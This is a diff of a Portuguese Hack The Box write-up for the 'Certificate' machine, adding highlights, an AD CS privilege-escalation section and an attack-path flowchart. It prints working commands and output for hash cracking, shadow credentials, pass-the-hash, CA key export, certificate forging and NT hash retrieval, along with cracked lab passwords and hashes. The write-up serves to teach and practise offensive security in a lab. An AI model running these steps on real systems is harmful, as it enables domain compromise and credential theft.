@@ -25,8 +25,8 @@ Dito isso, sem mais demora, vamos começar!
 
 O resultado do NMAP mostrou que se tratava de um ` Windows Active Directory`. 
 
-```bash
-PORT STATE SERVICE REASON VERSION
+```bash {3}
+PORT STATE SERVICE REASON VERSION 
 53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
 80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
 |_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
@@ -148,8 +148,8 @@ c:\xampp>type passwords.txt
 
 Com as novas credenciais consegui encontrar a hash da usuária `Sara.B`, que possui privilégios administrativos.
 
-```bash
-c:\xampp\mysql\bin>mysql.exe -u root -e "SHOW DATABASES;"
+```bash {24}
+c:\xampp\mysql\bin>mysql.exe -u root -e "SHOW DATABASES;" 
 Database
 certificate_webapp_db
 information_schema
@@ -178,7 +178,7 @@ id      first_name      last_name       username        email   password        
 
 Usando `John The Ripper`, consegui quebrar a hash facilmente e obter a senha `Blink182`.
 
-```bash
+```bash {8}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-sara.b
 Using default input encoding: UTF-8
@@ -189,7 +189,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Blink182         (?)
 1g 0:00:00:05 DONE (2025-06-03 15:17) 0.1893g/s 2318p/s 2318c/s 2318C/s addison1..vallejo
 Use the "--show" option to display all of the cracked passwords reliably
-Session completed.
+Session completed. 
 ```
 
 ### Arquivo pcap
@@ -223,7 +223,7 @@ Lion.SK:$krb5pa$18$Lion.SK$CERTIFICATE$$23f5159fa1c66ed7b0e561543eba6c010cd31f7e
 
 Depois disso, usei o `John The Ripper` para quebrar a hash e obter a senha `!QAZ2wsx`.
 
-```bash
+```bash {11}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-Lion.SK
 Warning: detected hash type "krb5pa-sha1", but the string is also recognized as "HMAC-SHA256"
@@ -237,7 +237,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 !QAZ2wsx         (Lion.SK)
 1g 0:00:00:12 DONE (2025-06-03 19:42) 0.07968g/s 1121p/s 1121c/s 1121C/s goodman..doghouse
 Use the "--show" option to display all of the cracked passwords reliably
-Session completed.
+Session completed. 
 ```
 
 ### Shell como Lion.SK
@@ -279,7 +279,7 @@ Usando a ferramenta `Bloodhound-Python` do `Netexec`, fiz a enumeração de obje
 
 Usando os privilégios de `Sara.B`, eu obtive a `hash NT` do usuário `Ryan.K` por meio de um ataque `Shadow Credentials`.
 
-```bash
+```bash {25}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
 └─$ faketime "$(ntpdate -q DC01.certificate.htb | cut -d ' ' -f 1,2)" certipy-ad shadow auto -u sara.b@certificate.htb -p Blink182 -account Ryan.K
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
@@ -304,16 +304,16 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'ryan.k'
 [*] Restoring the old Key Credentials for 'Ryan.K'
 [*] Successfully restored the old Key Credentials for 'Ryan.K'
-[*] NT hash for 'Ryan.K': b1bc3d70e70f4f36b1509a65ae1a2ae6
+[*] NT hash for 'Ryan.K': b1bc3d70e70f4f36b1509a65ae1a2ae6 
 ```
 
 Usando a técnica `Pass-the-hash` com `Evil-Winrm`, consegui me logar como `Ryan.K`. Olhando os privilégios desse usuário, percebi que ele possuía o privilégio `SeManageVolumePrivilege`.
 
-```bash
+```bash {23}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
 └─$ evil-winrm -i certificate.htb -u 'Ryan.K' -H 'b1bc3d70e70f4f36b1509a65ae1a2ae6'
 
-Evil-WinRM shell v3.7
+Evil-WinRM shell v3.7 
 
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
 
@@ -343,6 +343,119 @@ O plano parecia perfeito, mas só parecia. Na realidade, toda tentativa de conex
 
 Por um momento me lembrei que o nome da máquina é Certificate e que até então, eu não havia explorado nenhuma falha referente a certificados. Então, usando o comando `certutil -Store My`, chequei se havia certificados pessoais usados pelo usuário `Ryan.K`. Felizmente, encontrei a **Raiz Certificadora** , ou `Root CA`, que poderia ser usada para gerar um certificado confiável, que poderia servir de base para forjar um certificado em nome do `Administrator`.
 
+```bash {46}
+*Evil-WinRM* PS C:\users\administrator\desktop> c:/temp/SeManageVolumeExploit.exe
+*Evil-WinRM* PS C:\users\administrator\desktop> certutil -Store My
+My "Personal"
+================ Certificate 0 ================ 
+Archived!
+Serial Number: 472cb6148184a9894f6d4d2587b1b165
+Issuer: CN=certificate-DC01-CA, DC=certificate, DC=htb
+ NotBefore: 11/3/2024 3:30 PM
+ NotAfter: 11/3/2029 3:40 PM
+Subject: CN=certificate-DC01-CA, DC=certificate, DC=htb
+CA Version: V0.0
+Signature matches Public Key
+Root Certificate: Subject matches Issuer
+Cert Hash(sha1): 82ad1e0c20a332c8d6adac3e5ea243204b85d3a7
+  Key Container = certificate-DC01-CA
+  Unique container name: 6f761f351ca79dc7b0ee6f07b40ae906_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Provider = Microsoft Software Key Storage Provider
+Signature test passed
+
+================ Certificate 1 ================
+Serial Number: 5800000002ca70ea4e42f218a6000000000002
+Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+ NotBefore: 11/3/2024 8:14 PM
+ NotAfter: 11/3/2025 8:14 PM
+Subject: CN=DC01.certificate.htb
+Certificate Template Name (Certificate Type): DomainController
+Non-root Certificate
+Template: DomainController, Domain Controller
+Cert Hash(sha1): 779a97b1d8e492b5bafebc02338845ffdff76ad2
+  Key Container = 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Simple container name: te-DomainController-3ece1f1c-d299-4a4d-be95-efa688b7fee2
+  Provider = Microsoft RSA SChannel Cryptographic Provider
+Private key is NOT exportable
+Encryption test passed
+
+================ Certificate 2 ================
+Serial Number: 75b2f4bbf31f108945147b466131bdca
+Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+ NotBefore: 11/3/2024 3:55 PM
+ NotAfter: 11/3/2034 4:05 PM
+Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+Certificate Template Name (Certificate Type): CA
+CA Version: V0.0
+Signature matches Public Key
+Root Certificate: Subject matches Issuer
+Template: CA, Root Certification Authority
+Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
+  Key Container = Certificate-LTD-CA
+  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Provider = Microsoft Software Key Storage Provider
+Signature test passed
+CertUtil: -store command completed successfully.
+```
+
+Daí exportei esse certificado com sua chave privada para um arquivo `pfx` (Personal Information Exchange).
+
+```bash
+*Evil-WinRM* PS C:\users\administrator\desktop> certutil -exportPFX My 75b2f4bbf31f108945147b466131bdca cert.pfx
+My "Personal"
+================ Certificate 2 ================
+Serial Number: 75b2f4bbf31f108945147b466131bdca
+Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+ NotBefore: 11/3/2024 3:55 PM
+ NotAfter: 11/3/2034 4:05 PM
+Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+Certificate Template Name (Certificate Type): CA
+CA Version: V0.0
+Signature matches Public Key
+Root Certificate: Subject matches Issuer
+Template: CA, Root Certification Authority
+Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
+  Key Container = Certificate-LTD-CA
+  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Provider = Microsoft Software Key Storage Provider
+Signature test passed
+Enter new password for output file cert.pfx:
+Enter new password:
+Confirm new password:
+CertUtil: -exportPFX command completed successfully.
+```
+
+Depois de fazer o download do arquivo para minha máquina, usei a ferramenta `Certipy-ad` para forjar um certificado de autenticação em nome do usuário `Administrator`.
+
+```bash
+┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
+└─$ certipy-ad forge -ca-pfx cert.pfx -out golden.pfx -upn Administrator
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Saving forged certificate and private key to 'golden.pfx'
+[*] Wrote forged certificate and private key to 'golden.pfx'
+```
+
+Por fim, obtive a `hash NT` do `Administrator` com ataque `Golden Ticket`.
+
+```bash {13}
+┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
+└─$ faketime "$(ntpdate -q DC01.certificate.htb | cut -d ' ' -f 1,2)" certipy-ad auth -pfx golden.pfx -dc-ip $IP -user Administrator -domain certificate.htb
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator'
+[*] Using principal: 'administrator@certificate.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator' 
+[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
+```
+
+Usando novamente a técnica `Pass-the-hash` com `Evil-Winrm`, consegui me logar como `Administrator` e obter a flag do root.
+
 ## Conclusão
 
 ![[CertificateFinal.png | descrição da imagem]]
@@ -352,20 +465,14 @@ Palavras finais sobre o que aprendeu e CTA.
 ```mermaid
 flowchart TD
 	subgraph acesso inicial
-    A(acesso inicial) -->|CVE-2025-xxxx| B(www-data) 
-    B -->|db.php| C(user1)
+    A(Website) -->|concatenated zip file upload| B(xamppuser) 
+    B -->|mysql database| C(Sara.B)
+    C -->|arquivo pcap| D(Lion.SK)
+    D --> E[user.txt]
     end
     subgraph escalação de privilegios
-    C -->|exploit.sh| D(root)
-    C -->|portforward| E[web as root]
-    E -->|command execution| D(root)
+    C -->|shadow credentials| F(Ryan.K)
+    F -->|SeManageVolumeAbuse.exe| G[Privilégios Elevados]
+    G -->|golden ticket| H[root.txt]
     end
-```
-
-Você pode usar links internos: [[outra-nota]]
-E inserir imagens: ![[imagem.png | descrição da imagem]]
-Ou blocos de código:
-
-```bash
-echo "Exemplo de comando"
 ```
